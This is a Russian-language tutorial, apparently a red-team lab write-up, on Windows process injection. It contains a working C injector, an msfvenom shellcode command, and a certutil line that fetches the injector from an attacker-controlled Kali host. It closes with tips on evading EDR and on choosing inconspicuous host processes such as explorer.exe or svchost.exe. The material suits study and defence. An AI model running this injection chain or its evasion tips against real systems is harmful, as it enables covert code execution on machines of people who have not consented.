## Что такое инжект

Инжект — это внедрение вредоносного кода в запущенный процесс Windows. Процесс — это экземпляр выполняемой программы, который имеет свою область памяти, идентификатор (PID), права доступа и потоки выполнения. Мы используем стандартные Windows API, чтобы открыть процесс, выделить в нём память, записать туда наш код и запустить его как новый поток. Это классическая техника T1055 по классификации MITRE ATT&CK.


## Четыре шага инжекта

**Первый шаг** — открыть целевой процесс с полными правами через `OpenProcess`. Мы передаём PID процесса из командной строки и запрашиваем доступ `PROCESS_ALL_ACCESS`, чтобы иметь возможность выделять память, писать в неё и создавать потоки.

**Второй шаг** — выделить память внутри целевого процесса функцией `VirtualAllocEx`. Указываем размер, равный нашему шелл-коду, и выставляем флаг `PAGE_EXECUTE_READWRITE`, чтобы память была исполняемой и доступной для записи.

**Третий шаг** — записать шелл-код в выделенную область памяти через `WriteProcessMemory`. Копируем наш массив байтов в адресное пространство целевого процесса.

**Четвёртый шаг** — создать удалённый поток функцией `CreateRemoteThread`, указав в качестве точки входа адрес записанного шелл-кода. Поток запускается сразу и выполняет наш код в контексте целевого процесса.


## Что мы сделали на практике

**Первое** — написали инжектор на C с использованием Windows API. Код открывает процесс, выделяет память, записывает шелл-код и создаёт поток.

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
}
```

**Второе** — сгенерировали шелл-код через `msfvenom` на Kali для запуска калькулятора:
```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
```
Полученный массив байтов вставили в исходный код.

**Третье** — скомпилировали инжектор под 64-битную Windows:
```bash
x86_64-w64-mingw32-gcc injector.c -o injector.exe -O2 -s
```

**Четвёртое** — передали скомпилированный файл на целевую машину через HTTP-сервер и `certutil`.

```cmd
certutil -urlcache -f http://<Kali_IP>:8080/injector.exe injector.exe
```

**Пятое** — нашли PID процесса для внедрения через `tasklist /V`.

**Шестое** — запустили инжектор с найденным PID:
```cmd
injector.exe 4104
```

После успешного выполнения шелл-код открывает калькулятор в контексте целевого процесса, что подтверждает работоспособность инжекта.


## Ограничения при инжекте

Важно понимать: **внедриться можно не в любой процесс**. Есть жесткие ограничения, которые делятся на технические и защитные.


### Технические ограничения

**Разрядность процесса.** Нельзя внедрить 64-битный шелл-код в 32-битный процесс и наоборот. Если целевой процесс 32-битный, инжектор тоже должен быть 32-битным, а шелл-код — сгенерирован под 32-битную архитектуру. Игнорирование этого правила приведет к ошибке выполнения или падению процесса.

**Привилегии доступа.** Для открытия процесса с флагом `PROCESS_ALL_ACCESS` требуются права администратора. Без них `OpenProcess` вернет ошибку доступа. Чтобы обойти это, инжектор нужно запускать из консоли, открытой от имени Администратора, либо запрашивать только минимально необходимые права: `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE`.

**Системные процессы с PID ниже 1000.** Процессы вроде `csrss.exe`, `winlogon.exe`, `lsass.exe` защищены на уровне ядра. Даже с правами SYSTEM доступ к ним может быть ограничен. Для работы с ними требуется включить привилегию `SeDebugPrivilege`, что обычно доступно только системным сервисам или отладчикам.


### Защитные механизмы

**PPL (Protected Process Light).** Некоторые критические процессы, включая антивирусы и `lsass.exe`, работают в режиме PPL. Это не позволяет открыть их с правами записи или создания потоков. Даже с максимальными привилегиями доступ будет отклонен. Обход требует использования уязвимых драйверов или специальных эксплойтов.

**Антивирусы и EDR.** Современные средства защиты отслеживают вызовы `VirtualAllocEx`, `WriteProcessMemory` и `CreateRemoteThread`. При обнаружении инжекта процесс может быть завершен, а пользователь получит уведомление. Чтобы обойти это, используются менее заметные техники: внедрение через `SetWindowsHookEx`, использование асинхронных вызовов или шифрование шелл-кода.


### Практические выводы

Для тестирования лучше выбирать пользовательские процессы: `explorer.exe`, `notepad.exe`, `calc.exe`, либо процессы с нестандартными именами, которые явно созданы как мишень. Системные и защищенные процессы трогать бессмысленно — инжект в них либо не сработает, либо вызовет подозрения. На практике в реальных RedTeam-операциях инжект чаще всего выполняется в `explorer.exe` или `svchost.exe`, так как они всегда запущены, имеют доверие со стороны системы и редко проверяются на наличие инъекций. Однако даже там успех зависит от настроек EDR и антивируса.
